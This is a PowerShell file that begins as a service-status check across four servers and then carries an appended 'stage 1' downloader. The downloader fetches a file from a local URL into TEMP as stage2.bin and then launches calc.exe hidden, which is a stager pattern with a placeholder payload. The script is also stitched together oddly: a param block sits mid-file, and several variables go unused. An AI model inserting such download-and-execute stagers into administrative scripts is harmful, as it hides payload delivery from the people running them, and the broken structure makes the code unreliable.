$Servers             = @('web-prod-03', 'srv02', 'app-prod-01', 'mgmt01')
$Services            = @('Spooler', 'DNS')
$Port                = 5986
$TimeoutMilliseconds = 5000
$ReportPath          = "C:\Reports\service-health-2024-08-12.csv"

$results = foreach ($srv in $Servers) {
    foreach ($svc in $Services) {
        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Server  = $srv
            Service = $svc
            Status  = $(if ($service) { $service.Status } else { 'NotFound' })
        }
    }
}
$results | Format-Table -AutoSize
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$Stage1Url = 'http://localhost:8080/stage1.ps1',
    [string]$OutputPath = "$env:TEMP\stage2.bin",
    [int]$StageTimeout = 141
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $ResultObject = Invoke-Stage1Download -SourceUrl $Stage1Url -DestinationPath $OutputPath -TimeoutSec $StageTimeout
    if ($ResultObject) {
        Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
